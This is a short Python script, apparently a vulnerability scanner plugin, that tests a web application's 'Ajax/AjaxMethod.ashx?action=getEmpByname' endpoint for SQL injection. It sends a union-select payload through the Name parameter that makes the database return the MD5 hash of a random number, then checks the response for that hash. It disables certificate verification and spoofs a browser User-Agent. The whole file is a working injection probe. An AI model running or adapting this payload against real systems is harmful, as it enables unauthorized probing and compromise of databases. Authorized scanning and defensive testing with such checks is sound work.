import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def substr(strs,s,lens):
	result=strs[s:s+lens]
	return result
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r1=randomInt(10000, 20000)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y'+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{r1}')),3,32)--"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 500 and substr(md5(str(r1).encode()).hexdigest(), 0, 32) in response.text:
		sqli=True
	else:
		sqli=False
	if sqli:
		return True
	else:
		return False
